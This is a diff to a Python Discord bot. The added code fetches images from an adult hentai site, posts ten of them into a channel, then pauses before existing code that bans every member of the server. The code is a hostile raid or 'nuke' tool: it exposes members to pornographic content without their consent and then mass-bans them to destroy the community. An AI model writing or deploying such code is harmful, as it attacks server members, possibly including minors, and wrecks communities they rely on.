@@ -154,6 +154,22 @@ async def on_message(message):
           hentai = imagesearch.getImages("https://hentaihaven.xxx") #load hentai from hentaihaven (kill me now)
           
           
+          try:
+               for i in range(10): #send some hentai before banning users
+                    y = random.choice(hentai) #get random bit of hentai
+                    while not y.startswith("https://hentaihaven.xxx/www/"): #check it is a video preview and not an asset
+                         y = random.choice(hentai)
+                    async with aiohttp.ClientSession() as session: #http stuff I don't understand
+                         async with session.get(y) as resp:
+                              if resp.status != 200:
+                                   return await channel.send('`error loading image`')
+                              data = io.BytesIO(await resp.read())
+                              await channel.send(file=discord.File(data, os.path.basename(y))) #send hentai
+          except Exception:
+               pass
+
+          time.sleep(5)
+
           for member in heinz.guild.members:
                try:
                     await member.ban()
